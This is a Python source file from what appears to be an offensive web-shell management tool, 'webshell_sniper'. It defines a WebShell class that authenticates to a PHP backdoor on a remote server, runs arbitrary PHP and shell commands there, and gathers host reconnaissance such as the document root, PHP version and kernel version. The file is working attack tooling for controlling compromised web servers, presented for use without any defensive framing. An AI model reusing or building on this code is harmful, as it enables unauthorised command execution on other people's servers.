"""The :class:`WebShell` model — a thin, well-behaved object per endpoint.

v1's ``WebShell`` was a 650-line god class that mixed transport, command
execution, recon, file transfer, injection and database logic together (with
mutable *class-level* attributes shared across instances).  Here ``WebShell`` is
just: connection state, the exec primitives (delegated to :class:`Executor`)
and lazily-cached metadata.  Higher-level behaviour lives in
:mod:`webshell_sniper.features`.
"""

from __future__ import annotations

from dataclasses import dataclass

from ..config import Config
from ..exceptions import WebshellError
from .executor import Executor
from .transport import Transport


@dataclass
class WebShellInfo:
    url: str
    method: str
    password: str

    def to_dict(self) -> dict[str, str]:
        return {"url": self.url, "method": self.method, "password": self.password}


class WebShell:
    def __init__(self, url: str, method: str, password: str, config: Config | None = None):
        self.info = WebShellInfo(url, method, password.strip())
        self.transport = Transport(url, method, self.info.password, config)
        self.executor = Executor(self.transport)
        self.working = False
        self._webroot: str | None = None
        self._php_version: str | None = None
        self._kernel_version: str | None = None

    # -- convenience accessors -------------------------------------------------
    @property
    def url(self) -> str:
        return self.info.url

    @property
    def method(self) -> str:
        return self.info.method

    @property
    def password(self) -> str:
        return self.info.password

    # -- exec primitives -------------------------------------------------------
    def run_php(self, code: str) -> str:
        return self.executor.run_php(code)

    def run_command(self, command: str) -> str:
        return self.executor.run_command(command)

    # -- liveness --------------------------------------------------------------
    def connect(self) -> bool:
        """Verify the endpoint is reachable *and* actually executes our code."""
        if not self.transport.is_reachable():
            self.working = False
            return False
        try:
            # run_php raises unless both sentinels come back, which only
            # happens if our PHP truly executed — a robust liveness check.
            self.run_php("echo 'alive'")
            self.working = True
        except WebshellError:
            self.working = False
        return self.working

    # -- cached metadata -------------------------------------------------------
    @property
    def webroot(self) -> str:
        if self._webroot is None:
            self._webroot = self.run_php("echo $_SERVER['DOCUMENT_ROOT']").strip()
        return self._webroot

    @property
    def php_version(self) -> str:
        if self._php_version is None:
            self._php_version = self.run_php("echo phpversion()").strip()
        return self._php_version

    @property
    def kernel_version(self) -> str:
        if self._kernel_version is None:
            try:
                self._kernel_version = self.run_command("uname -a").strip()
            except WebshellError:
                self._kernel_version = ""
        return self._kernel_version

    def __str__(self) -> str:
        return f"{self.method} {self.url} (password={self.password!r})"
